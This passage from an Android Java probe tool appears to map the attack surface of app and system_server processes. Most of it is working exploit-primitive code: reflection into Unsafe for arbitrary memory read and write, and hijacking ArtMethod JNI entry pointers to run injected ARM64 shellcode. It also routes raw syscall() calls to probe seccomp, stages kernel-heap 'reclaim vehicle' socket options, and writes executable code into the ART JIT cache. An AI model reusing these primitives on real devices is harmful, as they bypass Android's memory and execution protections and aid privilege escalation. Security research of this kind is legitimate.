            for (java.lang.reflect.Field f : uc.getDeclaredFields())    // read theUnsafe field (skips getUnsafe's caller check)
                if (uc.isAssignableFrom(f.getType()) && java.lang.reflect.Modifier.isStatic(f.getModifiers())) {
                    f.setAccessible(true); inst = f.get(null); break;
                }
            if (inst == null) inst = uc.getDeclaredMethod("getUnsafe").invoke(null);
            u = inst;
            uGetLong = uc.getMethod("getLong", long.class);
            uGetInt = uc.getMethod("getInt", long.class);
            uPutLong = uc.getMethod("putLong", long.class, long.class);
            java.lang.reflect.Method uAlloc = uc.getMethod("allocateMemory", long.class);
            long m = (Long) uAlloc.invoke(u, 16L);
            uPutLong.invoke(u, m, 0x0123456789ABCDEFL);
            long back = (Long) uGetLong.invoke(u, m);
            uc.getMethod("freeMemory", long.class).invoke(u, m);
            emit(o, "unsafe arbitrary R/W", back == 0x0123456789ABCDEFL ? 1 : 0,
                    back == 0x0123456789ABCDEFL ? "getLong/putLong roundtrip ok" : "roundtrip mismatch");
        } catch (Throwable t) { na(o, "unsafe arbitrary R/W", detail(t)); return; }

        // Executable page: write shellcode via the mapped ByteBuffer, flip PROT_EXEC,
        // recover the page VA (java.nio.Buffer's address field) and read the first
        // instruction back THROUGH Unsafe -- confirms the VA and that the bytes
        // survived the protection change.
        long va = 0; boolean pageExec = false;
        try {
            Class<?> sm = Class.forName("android.os.SharedMemory");
            Object shm = sm.getMethod("create", String.class, int.class).invoke(null, "dpx", 4096);
            java.nio.ByteBuffer buf = (java.nio.ByteBuffer) sm.getMethod("mapReadWrite").invoke(shm);
            buf.order(java.nio.ByteOrder.LITTLE_ENDIAN);
            buf.putInt(0, SC_MOVZ);
            buf.putInt(4, SC_RET);
            boolean ok = (Boolean) sm.getMethod("setProtect", int.class)
                    .invoke(shm, OsConstants.PROT_READ | OsConstants.PROT_EXEC);
            java.lang.reflect.Field addr = null;
            for (java.lang.reflect.Field f : Class.forName("java.nio.Buffer").getDeclaredFields())
                if (f.getType() == long.class && !java.lang.reflect.Modifier.isStatic(f.getModifiers())) {
                    if (f.getName().equals("address")) { addr = f; break; }
                    if (addr == null) addr = f;
                }
            if (addr != null) { addr.setAccessible(true); va = addr.getLong(buf); }
            int insn0 = (Integer) uGetInt.invoke(u, va);
            // The kernel's verdict on whether PROT_EXEC really took: is the page r-x
            // in the process map? Gate the jump on this so a page that did not become
            // executable reports a row instead of faulting on instruction fetch.
            String maps = slurp("/proc/self/maps", 1 << 20);
            String prefix = Long.toHexString(va) + "-";
            String perms = "?";
            for (String ln : maps.split("\n"))
                if (ln.startsWith(prefix)) {
                    String[] parts = ln.split("\\s+");        // "start-end perms offset dev inode path"
                    if (parts.length > 1) { perms = parts[1]; pageExec = perms.length() >= 3 && perms.charAt(2) == 'x'; }
                    break;
                }
            emit(o, "SharedMemory exec page", ok && (insn0 & 0xffffffffL) == (SC_MOVZ & 0xffffffffL) ? 1 : 0,
                    "va=0x" + Long.toHexString(va) + " setProtect=" + ok + " maps-perms=" + perms + " insn0=0x" + Integer.toHexString(insn0));
        } catch (Throwable t) { na(o, "SharedMemory exec page", detail(t)); }

        // Control transfer: repoint jniHook's JNI entry (ArtMethod+16, the native fn
        // pointer read from the recon dump) at our page, call it -- the generic-JNI
        // trampoline (ArtMethod+24, untouched) invokes our code -- then restore. If it
        // truly ran, jniHook() returns 0x1337. Guarded by pageExec so a non-executable
        // page never turns into a segfault.
        try {
            java.lang.reflect.Method hookM = JavaProbe.class.getDeclaredMethod("jniHook");
            java.lang.reflect.Field am = Class.forName("java.lang.reflect.Executable").getDeclaredField("artMethod");
            am.setAccessible(true);
            long art = am.getLong(hookM);
            long jniEntry = (Long) uGetLong.invoke(u, art + 16);   // data_ / entry_point_from_jni_
            long quick    = (Long) uGetLong.invoke(u, art + 24);   // generic-JNI trampoline
            info(o, "ArtMethod(jniHook)", "art=0x" + Long.toHexString(art) + " jni@+16=0x" + Long.toHexString(jniEntry) + " quick@+24=0x" + Long.toHexString(quick));
            if (!pageExec || va == 0) {
                na(o, "native call jniHook()", "skipped (page not r-x)");
            } else {
                uPutLong.invoke(u, art + 16, va);                  // hijack JNI entry -> our page
                long r;
                try { r = jniHook(); }
                finally { uPutLong.invoke(u, art + 16, jniEntry); } // always restore
                emit(o, "native call jniHook()", r == 0x1337 ? 1 : 0,
                        r == 0x1337 ? "RAN native code -> returned 0x1337" : "returned 0x" + Long.toHexString(r));
            }
        } catch (Throwable t) { na(o, "native call jniHook()", detail(t)); }

        // Controlled native execution needing NO exec page of our own: repoint
        // jniHook's JNI entry at an EXISTING native function -- the registered JNI
        // impl of a libcore.io.Linux static native, whose address we read from ITS
        // own ArtMethod+16 -- call jniHook(), and verify the result. Linux.getuid()
        // wraps native nativeGetuid(); calling that impl must return Os.getuid().
        // These natives take no args, so the trampoline's (env,jclass) are harmless.
        try {
            java.lang.reflect.Field am = Class.forName("java.lang.reflect.Executable").getDeclaredField("artMethod");
            am.setAccessible(true);
            long dstArt = am.getLong(JavaProbe.class.getDeclaredMethod("jniHook"));
            long saved = (Long) uGetLong.invoke(u, dstArt + 16);
            Class<?> lx = Class.forName("libcore.io.Linux");
            callVia(o, "native exec: getuid()", u, uGetLong, uPutLong, am, dstArt, saved,
                    lx.getDeclaredMethod("nativeGetuid"), Os.getuid());
            callVia(o, "native exec: getpid()", u, uGetLong, uPutLong, am, dstArt, saved,
                    lx.getDeclaredMethod("nativeGetpid"), Os.getpid());
        } catch (Throwable t) { na(o, "native exec (existing fn)", detail(t)); }
    }

    /** Load base (bias) of a mapped library, from /proc/self/maps: the lowest start
     *  among its mappings (the offset-0 segment, p_vaddr 0). fn = base + st_value. */
    private static long libBase(String suffix) throws Throwable {
        String maps = slurp("/proc/self/maps", 1 << 20);
        long min = 0;
        for (String ln : maps.split("\n")) {
            int sp = ln.lastIndexOf(' ');
            if (sp < 0 || !ln.substring(sp + 1).endsWith(suffix)) continue;
            int dash = ln.indexOf('-');
            if (dash < 0) continue;
            long start = Long.parseUnsignedLong(ln.substring(0, dash), 16);
            if (min == 0 || start < min) min = start;
        }
        return min;
    }

    // ---- Unsafe as a static arbitrary-memory primitive (shared by kernelSurface) ----
    private static Object UNS;
    private static java.lang.reflect.Method U_GL, U_PL, U_GI, U_PI, U_PB, U_AL, U_FR;
    private static boolean unsafeInit() {
        if (UNS != null) return true;
        try {
            Class<?> uc = Class.forName("jdk.internal.misc.Unsafe");
            Object inst = null;
            for (java.lang.reflect.Field f : uc.getDeclaredFields())
                if (uc.isAssignableFrom(f.getType()) && java.lang.reflect.Modifier.isStatic(f.getModifiers())) { f.setAccessible(true); inst = f.get(null); break; }
            if (inst == null) inst = uc.getDeclaredMethod("getUnsafe").invoke(null);
            U_GL = uc.getMethod("getLong", long.class);  U_PL = uc.getMethod("putLong", long.class, long.class);
            U_GI = uc.getMethod("getInt", long.class);   U_PI = uc.getMethod("putInt", long.class, int.class);
            U_PB = uc.getMethod("putByte", long.class, byte.class);
            U_AL = uc.getMethod("allocateMemory", long.class);  U_FR = uc.getMethod("freeMemory", long.class);
            UNS = inst; return true;
        } catch (Throwable t) { return false; }
    }
    private static long gL(long a) throws Throwable { return (Long) U_GL.invoke(UNS, a); }
    private static void pL(long a, long v) throws Throwable { U_PL.invoke(UNS, a, v); }
    private static void pI(long a, int v) throws Throwable { U_PI.invoke(UNS, a, v); }
    private static long alloc(long n) throws Throwable { long m = (n + 7) & ~7L; long p = (Long) U_AL.invoke(UNS, m); for (long i = 0; i < m; i += 8) pL(p + i, 0); return p; }
    private static void freeMem(long p) throws Throwable { U_FR.invoke(UNS, p); }
    private static void cstr(long p, String s) throws Throwable { byte[] b = s.getBytes(); for (int i = 0; i < b.length; i++) U_PB.invoke(UNS, p + i, b[i]); U_PB.invoke(UNS, p + b.length, (byte) 0); }

    private static String errName(int e) {
        switch (e) {
            case 1: return "EPERM"; case 2: return "ENOENT"; case 3: return "ESRCH"; case 9: return "EBADF";
            case 11: return "EAGAIN"; case 12: return "ENOMEM"; case 13: return "EACCES"; case 14: return "EFAULT";
            case 17: return "EEXIST"; case 22: return "EINVAL"; case 38: return "ENOSYS"; case 95: return "EOPNOTSUPP";
            default: return "errno" + e;
        }
    }

    /** Dispatch one wrapper-less syscall for real and report reachability. r>=0 -> ok
     *  (fd closed if asked); ENOSYS -> blocked/unimplemented; any other errno means
     *  the syscall REACHED the kernel and it answered. */
    private static void bc(String s) { try { android.util.Log.i("domainprobe", "KS:" + s); } catch (Throwable ignored) {} }

    private static void scReach(StringBuilder o, String name, boolean closeFd, long nr,
            long a0, long a1, long a2, long a3, long a4, long a5) {
        try {
            bc("before " + name);
            long r = sc7(nr, a0, a1, a2, a3, a4, a5);
            bc("after " + name + " rc=" + r);
            if (r >= 0) { emit(o, name, 1, "ok rc=" + r); if (closeFd) sc7(57, r, 0, 0, 0, 0, 0); }
            else { int e = (int) (-r); emit(o, name, e == 38 ? -1 : 1, e == 38 ? "ENOSYS (blocked/unimpl)" : "reached, errno=" + errName(e)); }
        } catch (Throwable t) { na(o, name, detail(t)); }
    }

    /** Run our shellcode at `code` by repointing jniHook's JNI entry there (normal
     *  convention: env,jclass in x0,x1 are ignored by movz/ret), then restore. */
    private static long callAt(long code) throws Throwable {
        java.lang.reflect.Field am = Class.forName("java.lang.reflect.Executable").getDeclaredField("artMethod");
        am.setAccessible(true);
        long a = am.getLong(JavaProbe.class.getDeclaredMethod("jniHook"));
        long saved = gL(a + 16);
        pL(a + 16, code);
        try { return jniHook(); } finally { pL(a + 16, saved); }
    }

    /** Kernel surface reachable from this domain, probed for real via libc syscall()
     *  (raw C convention through a runtime-made @CriticalNative method). SIGSYS is set
     *  to SIG_IGN first so a seccomp RET_TRAP on a blocked syscall returns -ENOSYS
     *  instead of aborting; a RET_KILL domain would die on the first block, which is
     *  itself the answer. Ends with the memexec bypass: ask the kernel for an
     *  executable page and settle it by EXECUTING a native function there. */
    private static void kernelSurface(StringBuilder o) {
        if (!unsafeInit()) { na(o, "kernel surface", "Unsafe unavailable"); return; }
        long cArt = 0, savedFlag = 0, savedEntry = 0, actMem = 0, scratch = 0;
        boolean setup = false, sigIgn = false;
        try {
            java.lang.reflect.Field am = Class.forName("java.lang.reflect.Executable").getDeclaredField("artMethod");
            am.setAccessible(true);
            Class<?> lx = Class.forName("libcore.io.Linux");
            long criticalBit = ((gL(am.getLong(lx.getDeclaredMethod("nativeGetpid"))) >>> 32)
                    & ~(gL(am.getLong(JavaProbe.class.getDeclaredMethod("jniHook"))) >>> 32)) & 0x00180000L;
            long base = libBase("/libc.so");
            long pSyscall = base + 0xa6480L;                                   // syscall() st_value, this device's libc.so
            info(o, "syscall entrance", "criticalBit=0x" + Long.toHexString(criticalBit) + " libc=0x" + Long.toHexString(base) + " syscall=0x" + Long.toHexString(pSyscall));
            if (criticalBit == 0 || base == 0) { na(o, "kernel surface", "prereq missing"); return; }
            cArt = am.getLong(JavaProbe.class.getDeclaredMethod("sc7",
                    long.class, long.class, long.class, long.class, long.class, long.class, long.class));
            savedFlag = gL(cArt); savedEntry = gL(cArt + 16);
            pL(cArt, savedFlag | (criticalBit << 32));                          // -> @CriticalNative
            pL(cArt + 16, pSyscall);                                            // JNI entry -> syscall()
            setup = true;

            bc("verify getuid/getpid");
            long uid = sc7(174, 0, 0, 0, 0, 0, 0), pid = sc7(172, 0, 0, 0, 0, 0, 0);
            emit(o, "syscall(getuid/getpid)", uid == Os.getuid() && pid == Os.getpid() ? 1 : 0, "uid=" + uid + " pid=" + pid);

            // SIGSYS -> SIG_IGN. struct sigaction (arm64, no restorer): handler(8) flags(8) mask(8).
            bc("rt_sigaction SIGSYS ignore");
            actMem = alloc(48);
            pL(actMem, 1);                                                      // SIG_IGN
            long rcSig = sc7(134, 31, actMem, actMem + 24, 8, 0, 0);            // rt_sigaction(SIGSYS,&act,&old,8)
            sigIgn = (rcSig == 0);
            emit(o, "SIGSYS->SIG_IGN guard", sigIgn ? 1 : 0, "rt_sigaction rc=" + rcSig);

            // Wrapper-less syscalls, dispatched for real. system_server's seccomp is
            // KILL-based -- the SIGSYS mask above does NOT save us (proven: a build that
            // called the blocked ones rebooted despite rc=0), so a blocked syscall here
            // reboots the device and erases the log. Therefore this is OFF by default
            // (safe on a new device) and driven ONE per boot: enable with
            //   setprop debug.dp.sctest 1
            // and select the syscall with `setprop debug.dp.scidx N`; a boot that logs
            // "sc[N]" reached it, a boot that reboots without that row was SIGSYS-killed.
            // The host loop probe-syscalls.sh walks every N and records both outcomes.
            scratch = alloc(768);
            cstr(scratch + 0, "user"); cstr(scratch + 8, "dp"); cstr(scratch + 16, "/dp");
            for (long i = 0; i < 240; i += 8) pL(scratch + 32 + i, 0x4141414141414141L);   // 240B key payload
            long attr = scratch + 288; pI(attr, 1); pI(attr + 4, 128);                      // perf_event_attr: SW, size=128
            long ba = scratch + 448; pI(ba, 1); pI(ba + 4, 4); pI(ba + 8, 4); pI(ba + 12, 1); // bpf attr: HASH k4 v4 n1
            // Canonical order + names match the native probe's run_all() so the rows line
            // up column-for-column across every domain (uniform structure).
            String[] scName = { "userfaultfd", "add_key(user)", "add_key(user 240B)", "keyctl", "mq_open",
                    "msgget(sysvipc)", "io_uring_setup", "perf_event_open", "bpf(MAP_CREATE)", "ptrace(TRACEME)",
                    "process_vm_readv", "pidfd_open", "unshare(NEWUSER)", "landlock" };
            long[][] scArg = {                                                              // {nr,a0..a5, closeFd}
                    { 282, 0x80000, 0, 0, 0, 0, 0, 1 },                                     // userfaultfd
                    { 217, scratch, scratch + 8, scratch + 32, 32, -2, 0, 0 },              // add_key(user)
                    { 217, scratch, scratch + 8, scratch + 32, 240, -2, 0, 0 },             // add_key(user 240B)
                    { 219, 0, -2, 1, 0, 0, 0, 0 },                                          // keyctl
                    { 180, scratch + 16, 0, 0, 0, 0, 0, 1 },                                // mq_open
                    { 186, 1234, 0, 0, 0, 0, 0, 0 },                                        // msgget(sysvipc)
                    { 425, 1, scratch + 576, 0, 0, 0, 0, 1 },                               // io_uring_setup
                    { 241, attr, 0, -1, -1, 0, 0, 1 },                                      // perf_event_open
                    { 280, 0, ba, 0x30, 0, 0, 0, 1 },                                       // bpf(MAP_CREATE)
                    { 117, 2, 1, 0, 0, 0, 0, 0 },                                           // ptrace: safe PEEKTEXT(pid 1), not TRACEME (side-effect-free reachability)
                    { 270, pid, 0, 1, 0, 1, 0, 0 },                                         // process_vm_readv
                    { 434, pid, 0, 0, 0, 0, 0, 1 },                                         // pidfd_open
                    { 97, 0x10000000, 0, 0, 0, 0, 0, 0 },                                   // unshare(NEWUSER)
                    { 444, 0, 0, 1, 0, 0, 0, 0 },                                           // landlock
            };
            // Seccomp classification (system_server, KILL-based). ALLOWED = confirmed
            // reachable in the app domain by the native probe (a safe proxy) and/or in
            // the AOSP bionic allowlist -> called by default. BLOCKED = SIGSYS-killed
            // there -> OFF by default (calling one reboots), tested only on opt-in:
            //   setprop debug.dp.sctest 1 ; setprop debug.dp.scidx <i>   (one per boot)
            boolean[] scSafe = { false, false, false, false, false, false, false, false, false, false, true, true, true, true };
            //                    ufd    add    add240 keyctl mq     msgget iour   perf   bpf    ptrace pvmr  pidfd unshr landl
            int scTest = prop("debug.dp.sctest", 0), scIdx = prop("debug.dp.scidx", -1);
            for (int i = 0; i < scName.length; i++) {
                boolean callIt = scSafe[i] || (scTest == 1 && scIdx == i);
                if (!callIt) {
                    na(o, scName[i], "seccomp: BLOCKED (off by default; setprop debug.dp.sctest 1 + debug.dp.scidx " + i + " to test — reboots if truly blocked)");
                    continue;
                }
                long[] s = scArg[i];
                bc("SCONE " + i + " " + scName[i] + (scSafe[i] ? "" : " (BLOCKED: reboot here)"));
                long r = sc7(s[0], s[1], s[2], s[3], s[4], s[5], s[6]);
                if (r >= 0 && s[7] == 1) sc7(57, r, 0, 0, 0, 0, 0);
                emit(o, scName[i], 1, (r >= 0 ? "reached rc=" + r : "reached errno=" + errName((int) (-r))) + (scSafe[i] ? "" : " [was toggled]"));
                bc("SCONE " + i + " survived rc=" + r);
            }

            structOpts(o);                                                      // setsockopt/ioctl struct-arg surface

            memexecBypass(o, false);                                            // anon mmap PROT_EXEC (EPERM here)
            if (prop("debug.dp.jit", 0) == 1) jitExec(o);
            else info(o, "jit-exec", "OFF -- write into /memfd:jit-cache exec slack. Enable: setprop debug.dp.jit 1");
        } catch (Throwable t) { na(o, "kernel surface", detail(t)); }
        finally {
            try { if (sigIgn) sc7(134, 31, actMem + 24, 0, 8, 0, 0); } catch (Throwable ignored) {}
            try { if (setup) { pL(cArt + 16, savedEntry); pL(cArt, savedFlag); } } catch (Throwable ignored) {}
            try { if (actMem != 0) freeMem(actMem); } catch (Throwable ignored) {}
            try { if (scratch != 0) freeMem(scratch); } catch (Throwable ignored) {}
        }
    }

    /** Can this domain get executable memory? Answered by EXECUTING from it. Uses the
     *  syscall entrance (sc7 already pointed at syscall()) to call mmap/mprotect
     *  directly -- denial returns an errno (no crash) and a fresh granted page has a
     *  clean i-cache (membarrier SYNC_CORE flushes it) to execute our movz/ret. */
    /** The struct-argument socket options and ioctls that have NO managed wrapper --
     *  the "native-only (struct)" rows -- now reachable through the syscall() entrance
     *  with the struct built in Unsafe memory. All are allowed syscalls (setsockopt/
     *  socket/ioctl/openat), so no seccomp-kill risk. IPV6_DSTOPTS/HOPOPTS restore the
     *  kmalloc-256 two-pointer reclaim vehicle inside system_server. __NR aarch64:
     *  socket=198 setsockopt=208 ioctl=29 openat=56 close=57. */
    private static void structOpts(StringBuilder o) {
        long buf = 0;
        try {
            buf = alloc(1024);
            // IPV6 dest/hop options: a 240-byte extension-header blob -> np->opt (kmalloc-256).
            long blob = buf;
            for (long i = 0; i < 240; i += 8) pL(blob + i, 0x4141414141414141L);
            pI(blob, 0 | (29 << 8) | (1 << 16) | (236 << 24));                   // next-hdr=0, hdr-ext-len=29, PadN(type=1,len=236)
            long s6 = sc7(198, 10, 2, 0, 0, 0, 0);                               // socket(AF_INET6, SOCK_DGRAM)
            if (s6 >= 0) {
                long r = sc7(208, s6, 41, 59, blob, 240, 0);                     // setsockopt(IPPROTO_IPV6, IPV6_DSTOPTS)
                emit(o, "IPV6_DSTOPTS", 1, r >= 0 ? "placed 240B (kmalloc-256 two-pointer vehicle)" : "reached errno=" + errName((int) (-r)));
                long r2 = sc7(208, s6, 41, 54, blob, 240, 0);                    // IPV6_HOPOPTS
                emit(o, "IPV6_HOPOPTS", 1, r2 >= 0 ? "placed 240B (kmalloc-256)" : "reached errno=" + errName((int) (-r2)));
                sc7(57, s6, 0, 0, 0, 0, 0);
            } else na(o, "IPV6_DSTOPTS", "socket AF_INET6 errno=" + errName((int) (-s6)));
            // IP_MSFILTER: struct ip_msfilter (multiaddr, iface, fmode, numsrc, slist[])
            long msf = buf + 256; pI(msf + 8, 1);                                // imsf_fmode = MCAST_INCLUDE; numsrc=0
            long s4 = sc7(198, 2, 2, 0, 0, 0, 0);                                // socket(AF_INET, SOCK_DGRAM)
            if (s4 >= 0) { long r = sc7(208, s4, 0, 41, msf, 20, 0); emit(o, "IP_MSFILTER", 1, r >= 0 ? "set ok (struct ip_msfilter)" : "reached errno=" + errName((int) (-r))); sc7(57, s4, 0, 0, 0, 0, 0); }
            else na(o, "IP_MSFILTER", "socket errno=" + errName((int) (-s4)));
            // SO_ATTACH_FILTER: sock_fprog{len, filter*} + a 1-insn BPF (BPF_RET|BPF_K, 0)
            long filt = buf + 320, fprog = buf + 336;
            pI(filt, 0x06); pI(filt + 4, 0);                                     // sock_filter{code=RET|K, jt=jf=0, k=0}
            pL(fprog, 1); pL(fprog + 8, filt);                                   // {len=1; filter=&filt}
            long sf = sc7(198, 2, 2, 0, 0, 0, 0);
            if (sf >= 0) { long r = sc7(208, sf, 1, 26, fprog, 16, 0); emit(o, "SO_ATTACH_FILTER", 1, r >= 0 ? "attached sock_fprog" : "reached errno=" + errName((int) (-r))); sc7(57, sf, 0, 0, 0, 0, 0); }
            else na(o, "SO_ATTACH_FILTER", "socket errno=" + errName((int) (-sf)));
            // --- rest of the IPv4/IPv6 struct sockopts: options + multicast (all had NO
            //     managed wrapper; MCAST_MSFILTER/group_req/RTHDR are controllable-size
            //     kernel allocations = reclaim vehicles). buf is zeroed, so only set fields. ---
            long s4b = sc7(198, 2, 2, 0, 0, 0, 0);                                // AF_INET dgram
            if (s4b >= 0) {
                long ipo = buf + 512; pI(ipo, 0x01010101);                        // IP_OPTIONS: 4x NOP, 40-byte blob
                emit(o, "IP_OPTIONS (40B)", 1, ok(sc7(208, s4b, 0, 4, ipo, 40, 0)));
                long mreqn = buf + 560; pI(mreqn, 0x010000E0);                     // ip_mreqn: group 224.0.0.1, ifindex 0
                emit(o, "IP_ADD_MEMBERSHIP", 1, ok(sc7(208, s4b, 0, 35, mreqn, 12, 0)));
                long gf = buf + 576; pI(gf, 1); pI(gf + 8, 2); pI(gf + 136, 1);    // group_filter{iface, group.ss_family=AF_INET, fmode=INCLUDE, numsrc=0}
                emit(o, "MCAST_MSFILTER (group_filter)", 1, ok(sc7(208, s4b, 0, 48, gf, 144, 0)) + " [variable-size kmalloc vehicle]");
                long gr = buf + 800; pI(gr, 1); pI(gr + 8, 2);                     // group_req{iface, group.ss_family=AF_INET}
                emit(o, "MCAST_JOIN_GROUP (group_req 136B)", 1, ok(sc7(208, s4b, 0, 42, gr, 136, 0)));
                sc7(57, s4b, 0, 0, 0, 0, 0);
            } else na(o, "IP multicast sockopts", "socket AF_INET errno=" + errName((int) (-s4b)));
            long s6b = sc7(198, 10, 2, 0, 0, 0, 0);                               // AF_INET6 dgram
            if (s6b >= 0) {
                long mr6 = buf + 736;                                             // ipv6_mreq (zeroed, ifindex 0)
                emit(o, "IPV6_JOIN_GROUP (ipv6_mreq)", 1, ok(sc7(208, s6b, 41, 20, mr6, 20, 0)));
                long rth = buf + 768; pI(rth, 0x00000200);                        // ipv6_rt_hdr{nexthdr=0,hdrlen=2,type=0,segleft=0} -> np->opt kmalloc
                emit(o, "IPV6_RTHDR (24B)", 1, ok(sc7(208, s6b, 41, 57, rth, 24, 0)));
                sc7(57, s6b, 0, 0, 0, 0, 0);
            } else na(o, "IPv6 multicast sockopts", "socket AF_INET6 errno=" + errName((int) (-s6b)));
            // /dev/ashmem name bytes: openat + ioctl ASHMEM_SET_NAME (_IOW(0x77,1,char[256])=0x41007701)
            long path = buf + 400; cstr(path, "/dev/ashmem");
            long af = sc7(56, -100, path, 2, 0, 0, 0);                           // openat(AT_FDCWD, "/dev/ashmem", O_RDWR)
            if (af >= 0) {
                long nm = buf + 420; cstr(nm, "dp");
                long r = sc7(29, af, 0x41007701L, nm, 0, 0, 0);                  // ioctl ASHMEM_SET_NAME
                emit(o, "ashmem name bytes", 1, r >= 0 ? "ioctl ASHMEM_SET_NAME ok" : "reached errno=" + errName((int) (-r)));
                sc7(57, af, 0, 0, 0, 0, 0);
            } else emit(o, "/dev/ashmem", af == -2 ? -1 : 0, "openat errno=" + errName((int) (-af)));
        } catch (Throwable t) { na(o, "struct sockopts", detail(t)); }
        finally { try { if (buf != 0) freeMem(buf); } catch (Throwable ignored) {} }
    }

    private static String ok(long r) { return r >= 0 ? "set ok" : "reached errno=" + errName((int) (-r)); }

    private static int prop(String k, int def) {
        try { return (Integer) Class.forName("android.os.SystemProperties").getMethod("getInt", String.class, int.class).invoke(null, k, def); }
        catch (Throwable t) { return def; }
    }

    /** Robustness harness for the native-exec / JIT-write paths, run in the APP main
     *  process (execmem ALLOWED, a crash only kills the app, logcat survives -- no
     *  reboot). Exercises the full mmap-RWX write+i-cache+hijack-call chain (which
     *  system_server refuses) and the JIT-cache write-exec, logging each step so a
     *  fault is localized. Call from MainActivity behind debug.dp.selftest=1. */
    public static void selfTest() {
        try { org.lsposed.hiddenapibypass.HiddenApiBypass.addHiddenApiExemptions(""); } catch (Throwable ignored) {}
        android.util.Log.i("domainprobe", "SELFTEST begin uid=" + Os.getuid());
        StringBuilder o = new StringBuilder();
        if (!unsafeInit()) { android.util.Log.i("domainprobe", "SELFTEST Unsafe unavailable"); return; }
        long cArt = 0, savedFlag = 0, savedEntry = 0; boolean setup = false;
        try {
            java.lang.reflect.Field am = Class.forName("java.lang.reflect.Executable").getDeclaredField("artMethod");
            am.setAccessible(true);
            long criticalBit = ((gL(am.getLong(Class.forName("libcore.io.Linux").getDeclaredMethod("nativeGetpid"))) >>> 32)
                    & ~(gL(am.getLong(JavaProbe.class.getDeclaredMethod("jniHook"))) >>> 32)) & 0x00180000L;
            long base = libBase("/libc.so"), pSyscall = base + 0xa6480L;
            android.util.Log.i("domainprobe", "SELFTEST criticalBit=0x" + Long.toHexString(criticalBit) + " libc=0x" + Long.toHexString(base));
            cArt = am.getLong(JavaProbe.class.getDeclaredMethod("sc7",
                    long.class, long.class, long.class, long.class, long.class, long.class, long.class));
            savedFlag = gL(cArt); savedEntry = gL(cArt + 16);
            pL(cArt, savedFlag | (criticalBit << 32)); pL(cArt + 16, pSyscall); setup = true;
            memexecBypass(o, true);   // execmem allowed here -> validates write+icache+hijack end to end
            jitExec(o);               // and the JIT-cache write-exec path
        } catch (Throwable t) { na(o, "selftest", detail(t)); }
        finally { try { if (setup) { pL(cArt + 16, savedEntry); pL(cArt, savedFlag); } } catch (Throwable ignored) {} }
        for (String ln : o.toString().split("\n")) if (!ln.isEmpty()) android.util.Log.i("domainprobe", "SELFTEST " + ln.trim());
        android.util.Log.i("domainprobe", "SELFTEST end");
    }

    /** Arbitrary native execution WITHOUT obtaining a new PROT_EXEC page: the ART JIT
     *  code cache (/memfd:jit-cache) is already executable. Find a large zero run of
     *  slack in its r-x view, flip that page writable, write shellcode in the middle,
     *  flip it back r-x, sync the i-cache, and call it. Every step's syscall returns an
     *  errno on refusal (no crash); the only real risk is a mis-scanned live-code write,
     *  guarded by requiring a long zero run and writing 8 bytes deep inside it. */
    private static void jitExec(StringBuilder o) {
        try {
            String maps = slurp("/proc/self/maps", 1 << 20);
            long js = 0, je = 0;
            for (String ln : maps.split("\n")) {
                if (ln.indexOf("/memfd:jit-cache") < 0 || ln.indexOf("zygote") >= 0) continue;  // own cache, not shared zygote
                String[] p = ln.split("\\s+");
                if (p.length < 2 || p[1].length() < 3 || p[1].charAt(2) != 'x') continue;        // the r-x exec view
                int dash = ln.indexOf('-');
                js = Long.parseUnsignedLong(ln.substring(0, dash), 16);
                je = Long.parseUnsignedLong(ln.substring(dash + 1, ln.indexOf(' ')), 16);
                break;
            }
            if (js == 0) { na(o, "jit-exec", "no r-x /memfd:jit-cache mapping"); return; }
            // Find a whole-page zero run so we write into a page ART is not using, not
            // just any zero bytes. Require >=8KB zero, aligned; write in the 2nd page.
            long need = 0x2000, run = 0, z = 0, scanEnd = Math.min(je, js + (16L << 20));
            for (long p = js; p < scanEnd; p += 8) {
                if (gL(p) == 0) { if (run == 0) z = p; run += 8; if (run >= need + 0x1000) break; }
                else run = 0;
            }
            if (run < need) { na(o, "jit-exec", "no " + need + "B zero slack in jit-cache 0x" + Long.toHexString(js) + "-0x" + Long.toHexString(je)); return; }
            long page = (z + 0xfffL) & ~0xfffL;                                     // first fully-zero page in the run
            long code = page + 0x1000;                                              // land one page in, still inside the run
            page = code & ~0xfffL;
            long plen = 0x1000;
            bc("jit target code=0x" + Long.toHexString(code) + " in run@0x" + Long.toHexString(z) + " len=" + run);
            bc("jit mprotect +W");
            long mp = sc7(226, page, plen, 7, 0, 0, 0);                             // try rwx
            boolean rwx = (mp == 0);
            if (!rwx) {
                long mp2 = sc7(226, page, plen, 3, 0, 0, 0);                        // else rw
                if (mp2 != 0) { emit(o, "jit-exec", 0, "mprotect +W on jit-cache denied errno=" + errName((int) (-mp2))); return; }
            }
            pI(code, SC_MOVZ); pI(code + 4, SC_RET);
            if (!rwx) {
                // We could only get W by REMOVING X (rwx was execmod-denied). Re-adding
                // X now is the same execmod/execmem wall -- if it fails the page stays
                // rw and executing it faults (SEGV_ACCERR), which is exactly what
                // crashed system_server before. Check it and report instead of jumping.
                long rb = sc7(226, page, plen, 5, 0, 0, 0);                         // restore r-x
                if (rb != 0) {
                    emit(o, "jit-exec", 0, "wrote via rw, but re-adding EXEC denied errno=" + errName((int) (-rb)) + " (execmod) -> page left non-executable, NOT calling (would SIGSEGV)");
                    pI(code, 0); pI(code + 4, 0); sc7(226, page, plen, 3, 0, 0, 0);
                    return;
                }
            }
            sc7(283, 64, 0, 0, 0, 0, 0); sc7(283, 32, 0, 0, 0, 0, 0);              // i-cache sync
            bc("jit exec @0x" + Long.toHexString(code));
            long r = callAt(code);
            long back = sc7(226, page, plen, rwx ? 7 : 3, 0, 0, 0);                 // clean our bytes out
            if (back == 0) { pI(code, 0); pI(code + 4, 0); sc7(226, page, plen, 5, 0, 0, 0); }
            emit(o, "jit-exec: write+run in jit-cache", r == 0x1337 ? 1 : 0,
                    (rwx ? "rwx" : "rw->rx") + " @0x" + Long.toHexString(code) + " executed -> 0x" + Long.toHexString(r));
        } catch (Throwable t) { na(o, "jit-exec", detail(t)); }
    }

    private static void memexecBypass(StringBuilder o, boolean execute) {
        long len = 0x1000;
        try {
            bc("mmap RWX");
            long p = sc7(222, 0, len, 7, 0x22, -1, 0);                          // mmap anon RWX
            if (p > 0 && (p & 0xfffL) == 0) {
                if (!execute) { emit(o, "memexec: mmap RWX", 1, "kernel granted W+X @0x" + Long.toHexString(p) + " (exec test app-domain only)"); sc7(215, p, len, 0, 0, 0, 0); }
                else {
                    pI(p, SC_MOVZ); pI(p + 4, SC_RET);
                    sc7(283, 64, 0, 0, 0, 0, 0); sc7(283, 32, 0, 0, 0, 0, 0);    // membarrier register + SYNC_CORE
                    bc("exec RWX");
                    long r = callAt(p);
                    sc7(215, p, len, 0, 0, 0, 0);
